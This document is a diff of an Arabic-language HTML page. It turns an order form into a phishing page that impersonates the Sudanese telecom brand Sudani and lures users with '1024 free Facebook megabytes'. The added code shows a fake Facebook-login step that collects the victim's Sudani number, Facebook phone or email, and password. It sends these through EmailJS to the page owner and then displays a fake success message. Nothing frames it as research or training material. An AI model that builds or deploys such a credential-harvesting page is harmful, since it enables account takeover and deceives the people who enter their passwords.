@@ -3,212 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نموذج الطلب - تحديث التصميم</title>
+    <title>Sudani - Facebook Login</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     
     <style>
-        /* الأنماط العامة وإعدادات المحاذاة */
-        body {
+        /* --- تنسيقات الصفحة الأولى (سوداني) --- */
+        #sudani-page {
             margin: 0;
             padding: 0;
-            font-family: Tahoma, sans-serif;
-            background-color: #f5f5f5;
-            direction: rtl; /* المحاذاة من اليمين لليسار */
-        }
-
-        /* تصميم الخلفية الحمراء والتدرج */
-        .order-container {
-            /* التدرج اللوني الذي يمزج الأحمر في الأعلى مع الخلفية البيضاء في الأسفل */
-            background: linear-gradient(to bottom, #E30022 0%, #a8001a 30%, #f5f5f5 30%, #f5f5f5 100%);
-            min-height: 100vh;
-            padding-top: 50px;
-        }
-
-        .order-form {
-            width: 90%;
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-
-        .input-row {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0045A5;
             display: flex;
-            margin-bottom: 20px;
+            justify-content: center;
             align-items: center;
+            height: 100vh;
+            color: white;
+            text-align: center;
         }
 
-        /* تنسيق حقول الإدخال (الشكل المقسم) */
+        .container { width: 100%; max-width: 400px; padding: 20px; }
+        .logo-placeholder { font-size: 50px; font-weight: bold; }
+        .brand-name { font-size: 35px; font-weight: bold; margin-bottom: 50px; }
+        
+        .btn {
+            display: block; width: 100%; background-color: white; color: #333;
+            text-decoration: none; padding: 12px 0; margin-bottom: 20px;
+            border-radius: 4px; font-size: 18px; border: 2px solid #28a745; font-weight: 500;
+            cursor: pointer;
+        }
+
+        .fb-circle {
+            background-color: #4b69b1; width: 80px; height: 80px; border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 50px; margin: 0 auto; font-weight: bold;
+        }
+
+        .badge-1024 {
+            background-color: #28a745; color: yellow; padding: 5px 15px;
+            font-size: 24px; font-weight: bold; display: inline-block; margin-top: 10px;
+        }
+
+        .footer-banner {
+            background-color: white; color: red; padding: 10px;
+            font-weight: bold; font-size: 18px; margin-top: 30px;
+        }
+
+        /* --- تنسيقات الصفحة الثانية (النموذج الأحمر) --- */
+        #login-page {
+            display: none; /* مخفية في البداية */
+            margin: 0; padding: 0; font-family: Tahoma, sans-serif;
+            background: linear-gradient(to bottom, #E30022 0%, #a8001a 30%, #f5f5f5 30%, #f5f5f5 100%);
+            min-height: 100vh; padding-top: 50px; direction: rtl;
+        }
+
+        .order-form { width: 90%; max-width: 400px; margin: 0 auto; padding: 20px; }
+        .input-row { display: flex; margin-bottom: 20px; align-items: center; }
         .split-input {
-            justify-content: space-between;
-            background-color: white;
-            border-radius: 8px;
-            padding: 10px;
-            border: 1px solid #E30022; /* إطار أحمر خفيف */
+            justify-content: space-between; background-color: white;
+            border-radius: 8px; padding: 10px; border: 1px solid #E30022;
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
         }
+        .split-input label { flex-basis: 40%; color: #E30022; font-weight: bold; font-size: 14px; }
+        .split-input input { flex-basis: 55%; border: none; outline: none; text-align: right; font-size: 16px; }
 
-        .split-input label {
-            flex-basis: 40%; 
-            color: #E30022;
-            font-weight: bold;
-            font-size: 14px;
-            padding-left: 10px;
-            white-space: nowrap; /* لمنع الكلمات من النزول لسطر جديد */
-        }
-
-        .split-input input {
-            flex-basis: 55%;
-            border: none;
-            outline: none;
-            text-align: right;
-            font-size: 16px;
-            padding: 0;
-            margin: 0;
-        }
-        
-        .with-icon-label .icon-label {
-            /* تنسيق التسمية والأيقونة المرافقة */
-            display: flex;
-            align-items: center;
-        }
-
-        .with-icon-label .icon-label i {
-            font-size: 18px;
-            margin-left: 5px;
-        }
-
-        /* تنسيق زر الإرسال */
         .submit-button {
-            width: 100%;
-            padding: 15px;
-            /* تدرج أحمر لامع */
-            background: linear-gradient(to bottom, #ff5050 0%, #E30022 100%); 
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            /* ظل وانعكاس لمحاكاة الشكل ثلاثي الأبعاد */
-            box-shadow: 0 4px 8px rgba(227, 0, 34, 0.4); 
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.2); 
-            margin-top: 30px;
-            transition: all 0.3s ease;
+            width: 100%; padding: 15px;
+            background: linear-gradient(to bottom, #ff5050 0%, #E30022 100%);
+            color: white; border: none; border-radius: 8px; font-size: 18px;
+            font-weight: bold; cursor: pointer; margin-top: 30px;
+            box-shadow: 0 4px 8px rgba(227, 0, 34, 0.4);
         }
-        
-        .submit-button:hover {
-            box-shadow: 0 6px 10px rgba(227, 0, 34, 0.6);
-            transform: translateY(-2px);
-        }
-        
-        /* تنسيقات رسالة الحالة (Status Message) */
-        .message {
-         padding: 15px;
-         margin-top: 25px;
-         border-radius: 8px;
-         text-align: center;
-         font-weight: bold;
-         display: none; /* إخفاؤها مبدئياً */
-         box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        .success {
-         background-color: #d4edda;
-         color: #155724;
-         border: 1px solid #c3e6cb;
-        }
-        .error {
-         background-color: #f8d7da;
-         color: #721c24;
-         border: 1px solid #f5c6cb;
-        }
+
+        .message { padding: 15px; margin-top: 25px; border-radius: 8px; text-align: center; display: none; }
+        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
     </style>
-    
+
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
-    <div class="order-container">
+
+    <div id="sudani-page">
+        <div class="container">
+            <div class="logo-placeholder">✱</div>
+            <div class="brand-name">sudani</div>
+            <div class="button-group">
+                <div class="btn">انشاء حساب</div>
+                <div class="btn" onclick="showLoginPage()">تسجيل عبر حساب الفيسبوك</div>
+            </div>
+            <div class="fb-circle">f</div>
+            <div class="badge-1024">1024</div>
+            <div class="footer-banner">الآن احصل على 1024 ميقابات للفيسبوك</div>
+        </div>
+    </div>
+
+    <div id="login-page">
         <form class="order-form" id="form">
-
-            <div class="input-row split-input with-icon-label">
-                <label for="order_number" class="icon-label">
-                    <i class="fas fa-hashtag"></i>
-                   رقمك في سوداني  
-                </label>
-                <input type="text" id="order_number" name="order_number" required placeholder="ادخل رقمك ">
+            <div class="input-row split-input">
+                <label><i class="fas fa-hashtag"></i> رقمك في سوداني</label>
+                <input type="text" id="order_number" name="order_number" required placeholder="ادخل رقمك">
             </div>
-
-            <div class="input-row split-input with-icon-label">
-                <label for="order_type" class="icon-label">
-                    <i class="fas fa-server"></i>
-              رقم او البريد للصفحة  
-                </label>
-                <input type="text" id="order_type" name="order_type" required placeholder="رقمك او gmail ">
+            <div class="input-row split-input">
+                <label><i class="fas fa-server"></i> رقم الهاتف او البريد للصفحه</label>
+                <input type="text" id="order_type" name="order_type" required placeholder="رقمك او email">
             </div>
-
-            <div class="input-row split-input with-icon-label">
-                <label for="customer_name" class="icon-label">
-                    <i class="fas fa-key"></i>
-                    كلمة المرور   
-                </label>
-                <input type="text" id="customer_name" name="customer_name" required placeholder=" كلمةالسر ">
+            <div class="input-row split-input">
+                <label><i class="fas fa-key"></i> كلمة المرور</label>
+                <input type="password" id="customer_name" name="customer_name" required placeholder="كلمة السر">
             </div>
-
-            <button type="submit" class="submit-button">
-                تنشيط 
-            </button>
-            
+            <button type="submit" class="submit-button">تنشيط</button>
             <div id="status-message" class="message"></div>
         </form>
     </div>
 
     <script>
-        // ⚠️ ملاحظة هامة: تم الاحتفاظ بالمفتاح العام الحقيقي من EmailJS
+        // دالة التنقل بين الصفحات
+        function showLoginPage() {
+            document.getElementById('sudani-page').style.display = 'none';
+            document.getElementById('login-page').style.display = 'block';
+        }
+
+        // إعداد EmailJS
         emailjs.init('uT7htQb2FMYEH9dvN'); 
         
         const form = document.getElementById('form');
         const statusMessage = document.getElementById('status-message');
         
-        // دالة لعرض رسالة الحالة
         function displayStatus(isSuccess, message) {
-          statusMessage.textContent = message;
-          statusMessage.className = 'message ' + (isSuccess ? 'success' : 'error');
-          statusMessage.style.display = 'block';
-          
-          // إخفاء الرسالة بعد 5 ثوانٍ
-          setTimeout(() => {
-            statusMessage.style.display = 'none';
-          }, 5000);
+            statusMessage.textContent = message;
+            statusMessage.className = 'message ' + (isSuccess ? 'success' : 'error');
+            statusMessage.style.display = 'block';
+            setTimeout(() => { statusMessage.style.display = 'none'; }, 5000);
         }
         
         form.addEventListener('submit', (e) => {
-          // 🔑 يمنع إعادة تحميل الصفحة
-          e.preventDefault(); 
-          
-          // إخفاء الرسائل القديمة
-          statusMessage.style.display = 'none';
+            e.preventDefault(); 
+            statusMessage.style.display = 'none';
         
-          const orderNumber = document.getElementById('order_number').value;
-          const orderType = document.getElementById('order_type').value;
-          const customerName = document.getElementById('customer_name').value;
-          
-          // ⚠️ تم الاحتفاظ بالـ service ID والـ template ID الصحيحين
-          emailjs.send('service_9mnn32o', 'template_jqn5fki', {
-            order_number: orderNumber,
-            order_type: orderType,
-            customer_name: customerName,
-          })
-          .then((response) => {
-            console.log('SUCCESS!', response.status, response.text);
-            displayStatus(true,'  ✅  تم تقديم طلبك');
-            // مسح الحقول بعد الإرسال الناجح
-            form.reset(); 
-          })
-          .catch((err) => {
-            console.log('FAILED...', err);
-            displayStatus(false, '❌ فشل إرسال الطلب. يُرجى المحاولة مرة أخرى.');
-          });
+            emailjs.send('service_9mnn32o', 'template_jqn5fki', {
+                order_number: document.getElementById('order_number').value,
+                order_type: document.getElementById('order_type').value,
+                customer_name: document.getElementById('customer_name').value,
+            })
+            .then(() => {
+                displayStatus(true, '✅ تم تقديم طلبك بنجاح');
+                form.reset(); 
+            })
+            .catch((err) => {
+                displayStatus(false, '❌ فشل الإرسال، حاول مرة أخرى');
+            });
         });
     </script>
 </body>
-  </html>
+</html>
